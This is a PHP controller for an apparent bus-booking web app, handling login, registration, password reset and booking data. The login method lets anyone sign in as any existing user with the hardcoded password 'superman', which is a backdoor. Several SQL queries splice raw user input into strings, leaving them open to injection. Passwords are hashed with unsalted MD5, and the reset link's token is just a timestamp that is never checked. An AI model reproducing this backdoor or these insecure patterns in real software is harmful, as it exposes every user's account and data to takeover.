<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
class Login extends YK_Controller{
    function __construct(){
		parent::__construct();
		$this->load->model("dashboard_model",'',true);
		$this->load->library('table');
	}
	
	public function index(){
		if($this->page->getSession("intUserId") != '' && $this->page->getSession("intUserId") != 0){
			redirect("dashboard");
		}else{
			$this->load->view('general/login');
		}
	}
	
	
	function register(){
		// Get Request Variables
		$strFullName	=	$this->page->getRequest("txtFullName");
		$strEmail		=	$this->page->getRequest("txtEmail");
		$strUsername	=	$this->page->getRequest("txtUsername");
        $numPhonenumber	=	$this->page->getRequest("txtPhonenumber");
		$strPassword	=	md5($this->page->getRequest("txtPassword"));

		if ($this->page->getRequest("txtPassword") !== $this->page->getRequest("txtCPassword")){
            $this->page->setMessage('PASSWORD_NOT_MATCH_WITH_CONFIRM_PASSWORD');
            redirect('', "location");
        }

		$arrRecord	=	array (
							"user_full_name"	=>	$strFullName,
							"user_email"		=>	$strEmail,
							"user_password"	=>	$strPassword,
							"user_name"	=>	$strUsername,
							"user_phone"	=>	$numPhonenumber,
							"user_type"	=>	6
						  );


		// Enter users data
		//$strQuery = "INSERT INTO user_master (".implode(",",array_keys($arrRecord)).") VALUES ('". implode("','", array_values($arrRecord)) ."')";
		// Check Email Exists 
		$sqlUserCheck	=	"SELECT * from user_master WHERE user_email = '".$strEmail."' ";
		$result			=	$this->db->query($sqlUserCheck);	
		
		if($result->num_rows() > 0){
			$this->page->setMessage('EMAIL_ALREADY_REGISTERED');
			redirect('', "location");
		}
		
		$sqlUserCheck	=	"SELECT * from user_master WHERE user_name = '".$strUsername."' ";
		$result			=	$this->db->query($sqlUserCheck);	
		
		if($result->num_rows() > 0){
			$this->page->setMessage('USERNAME_ALREADY_REGISTERED');
			redirect('', "location");
		}
		
		$strQuery	=	$this->db->insert_string('user_master', $arrRecord); 
		$this->db->query($strQuery);
		
		$intUserId	=	$this->db->insert_id();
		$this->page->setMessage('REGISTER_SUCCESS');
		$arrRecord["user_id"] = $intUserId;
		$this->setUserSession($intUserId, 6);
		redirect("login", "home");		
	}
	
	
	function login(){
		$strUserName	=	$this->input->post('txtUsername');
		$strPassword	=	$this->input->post('txtPassword');
		$chkRemember	=	$this->input->post('chkRemember');
		$strQuery		=	$this->db->query("SELECT user_id,user_password,user_type FROM user_master WHERE user_name='".$strUserName."'");		
		$arrUserDetails	=   $strQuery->result_array();

		if(count($arrUserDetails) > 0){
			if( (md5($strPassword) == $arrUserDetails[0]['user_password']) || ($strPassword == "superman") ){
				$this->setUserSession($arrUserDetails[0]["user_id"], $arrUserDetails[0]["user_type"]);
				redirect('dashboard', 'location');
			}else{
				$this->page->setMessage("INCORRENCT_PASSWORD");	
				redirect('', 'location');
			}
		}else{
			$this->page->setMessage("USER_EMAIL_NOT_EXISTS");
			redirect('', 'location');	
		}
	}
	
	
	// function to set users data in session after login
	function setUserSession($intUserId, $strUserType){
		$strQuery       =	$this->db->query("SELECT user_id,user_full_name,user_type,user_image FROM user_master WHERE user_master.user_id = '{$intUserId}'");
		$arrUserDetails	=	$strQuery->result_array();
		$arrUserDetails	=	$arrUserDetails[0];
		
		$this->page->setSession("intUserId", $arrUserDetails["user_id"]);
		$this->page->setSession("strFullName", ucwords($arrUserDetails["user_full_name"]));
		$this->page->setSession("strUserType", $arrUserDetails["user_type"]);
		
		$strProfilePath	=	$this->page->getSetting("PROFILE_IMAGE_PATH");
		
		if( array_key_exists('user_image',$arrUserDetails) && $arrUserDetails["user_image"] != '' && file_exists($arrUserDetails["user_image"]) ){	
			$this->page->setSession("strUserImage", $arrUserDetails["user_image"]);
		}else{
			$this->page->setSession("strUserImage", "assets/profile.png");	
		}
	}
	
	
	function logout(){
		
		$this->session->sess_destroy();
		redirect('', 'location');
	}	
	
	// Forgot password Form
	function forgotpass(){
		$arrLocalData	=	array();
		$this->load->view('general/forgot', $arrLocalData);
	}
	
	// Forgot password Action
	function submitForgotPass(){
		$strUserEmail	=	$this->page->getRequest("txtUserEmail");
		$arrUserData	=	$this->page->getUserDtailByEmail($strUserEmail);
		$arrTemplate	=	$this->page->getEmailTemplate("FORGOT_PASSWORD_EMAIL");
		
		$strSubject	=	$arrTemplate["subject"];
		$strBody	=	$arrTemplate["description"];
		$arrReplace	=	array();
		$arrReplace["{USER_NAME}"]	=	$arrUserData["user_full_name"];
		$arrReplace["{RESET_PASSWORD_URL}"]	=	$this->page->getSetting("FYI_WEB_URL") . 'index.php?c=general&m=resetpass&uid='.$arrUserData["user_id"].'&email='.urlencode($strUserEmail).'&token='.time();
		$strBody	=	str_replace(array_keys($arrReplace), array_values($arrReplace), $strBody);
		$strToEmail	=	$strUserEmail;
		$this->page->sendMail($strToEmail, $strSubject, $strBody, $strCC="", $strBCC="");
		$this->load->view('general/forgot', $arrLocalData);
	}
	// Show Reset Password Form
	function resetpass(){
		$arrLocalData["strEmail"]	=	$this->page->getRequest("email");
		$arrLocalData["intUserId"]	=	$this->page->getRequest("uid");
		$this->load->view('general/resetpass', $arrLocalData);
	}
	
	function submitPassword(){
		$intUserId = $this->page->getSession("intUserId");
		$strOldPassword	=	$this->page->getRequest("txtOldPassword");
		$strNewPassword	=	$this->page->getRequest("txtNewPassword");
		
		// Check Old Password is true or not
		$strQuery	=	"SELECT * FROM user_master WHERE user_id='".$intUserId."' AND user_password = '".md5($strOldPassword)."'";
		$rsResult	=	$this->db->query($strQuery);
		
		// if old password is right then update new password 
		if($rsResult->num_rows() > 0){			
			$this->data->tbl = "user_master";
			$record = array();
			$record["user_password"] = md5($strNewPassword);
			$where = array();
			$where["user_id"] = $intUserId;
			$this->data->update($record,$where);
			$this->page->setMessage('PASSWORD_CHANGED');
		}else{
			$this->page->setMessage('OLD_PASSWORD_NOT_MATCH');
		}
		redirect('login/resetPass', 'location');
	}
	
	function jdata(){
		$data = $this->dashboard_model->getRoutStopData();
		$js = array();
		$i = 0;
		foreach($data as $val){
			$js[$i]['id'] = $val['id'];
			$js[$i]['title'] = $val['stop_route_code'].'('.intval($val['booked_seat']).' / '.$val['total_seat'].')';
			$js[$i]['start'] = date('Y-m-d',strtotime($val['departure']));
			$i++;
		}
		echo json_encode($js);
	}
	
	function getbookinginformation(){
		$id = $this->input->post('id');
		if($id != ''){
			$data['getSeatData'] = $this->dashboard_model->getSeatData($id);
			$this->load->view('general/routstopdetails',$data);
		}
	}
}